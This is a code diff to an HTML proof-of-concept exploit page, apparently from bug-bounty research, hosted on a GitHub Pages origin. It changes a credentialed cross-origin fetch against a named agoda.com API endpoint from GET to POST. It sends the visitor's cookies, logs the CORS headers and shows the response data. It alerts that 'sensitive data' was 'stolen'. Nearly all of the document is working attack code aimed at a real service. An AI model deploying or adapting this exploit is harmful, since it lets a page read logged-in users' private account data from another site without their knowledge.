@@ -31,6 +31,7 @@
             font-size: 13px; 
             max-height: 400px;
             overflow-y: auto;
+            white-space: pre-wrap;
         }
         .status { 
             font-weight: bold; 
@@ -46,9 +47,10 @@
 <body>
 
 <div class="box">
-    <h2>Exploit Proof-of-Concept</h2>
+    <h2>Exploit Proof-of-Concept (POST Method)</h2>
     <p>Target: <code>www.agoda.com/api/cronos/layout/notification/get</code></p>
     <p>Source Origin: <code>https://stelemane.github.io/poc-site/</code></p>
+    <p>Method: <code>POST</code></p>
     
     <div id="status" class="status info">[*] Initializing Request...</div>
     <pre id="output">Waiting for data...</pre>
@@ -61,18 +63,36 @@
         
         const target = "https://www.agoda.com/api/cronos/layout/notification/get";
 
-        statusDiv.innerText = "[*] Sending request with Credentials...";
+        statusDiv.innerText = "[*] Sending POST request with Credentials...";
 
         fetch(target, {
-            method: "GET",
+            method: "POST",                    // ✅ تغيير إلى POST
             mode: "cors",
-            credentials: "include"
+            credentials: "include",
+            headers: {
+                "Content-Type": "application/json",
+                "Accept": "application/json"
+            },
+            body: JSON.stringify({})           // Body فارغ (يمكن تعديله لاحقاً)
         })
         .then(response => {
+            // تسجيل Headers المهمة للتحليل
+            const corsOrigin = response.headers.get('Access-Control-Allow-Origin');
+            const corsCredentials = response.headers.get('Access-Control-Allow-Credentials');
+            
+            console.log("=== CORS Analysis ===");
+            console.log("Access-Control-Allow-Origin:", corsOrigin);
+            console.log("Access-Control-Allow-Credentials:", corsCredentials);
+            console.log("Status:", response.status);
+            
+            outputDiv.innerText += `\n[DEBUG] Access-Control-Allow-Origin: ${corsOrigin || 'NOT FOUND'}\n`;
+            outputDiv.innerText += `[DEBUG] Access-Control-Allow-Credentials: ${corsCredentials || 'NOT FOUND'}\n`;
+            outputDiv.innerText += `[DEBUG] HTTP Status: ${response.status}\n\n`;
+            
             if (response.ok) {
                 statusDiv.innerText = "[+] SUCCESS: Data Extracted Successfully!";
                 statusDiv.className = "status success";
-                return response.json();
+                return response.text();
             } else {
                 statusDiv.innerText = "[-] FAILED: Server returned status " + response.status;
                 statusDiv.className = "status error";
@@ -80,16 +100,27 @@
             }
         })
         .then(data => {
-            outputDiv.innerText = typeof data === 'object' ? JSON.stringify(data, null, 2) : data;
-            
-            if (typeof data === 'object' && data.success !== false) {
-                alert("Vulnerability Confirmed!\nData stolen from agoda.com");
+            try {
+                const parsed = JSON.parse(data);
+                outputDiv.innerText += "=== Response Body ===\n" + JSON.stringify(parsed, null, 2);
+                
+                // التحقق من وجود بيانات حساسة
+                if (parsed && (parsed.userId || parsed.email || parsed.notifications || parsed.data)) {
+                    alert("⚠️ Vulnerability Confirmed!\nSensitive data stolen from agoda.com\n\nCheck console for details.");
+                }
+            } catch (e) {
+                outputDiv.innerText += "=== Raw Response ===\n" + data;
             }
         })
         .catch(err => {
-            statusDiv.innerText = "[-] ERROR: CORS Policy blocked the access.";
+            statusDiv.innerText = "[-] ERROR: " + err.message;
             statusDiv.className = "status error";
-            outputDiv.innerText = err.toString() + "\n\nNote: This means the server did not reflect the Origin: https://stelemane.github.io/poc-site/";
+            outputDiv.innerText += "\n\n=== ERROR DETAILS ===\n";
+            outputDiv.innerText += err.toString() + "\n\n";
+            outputDiv.innerText += "This likely means:\n";
+            outputDiv.innerText += "1. The server did NOT return 'Access-Control-Allow-Origin: https://stelemane.github.io/poc-site/'\n";
+            outputDiv.innerText += "2. Browser blocked reading the response due to CORS policy\n";
+            outputDiv.innerText += "3. Check Network tab in DevTools for the actual response headers";
             console.error(err);
         });
     };
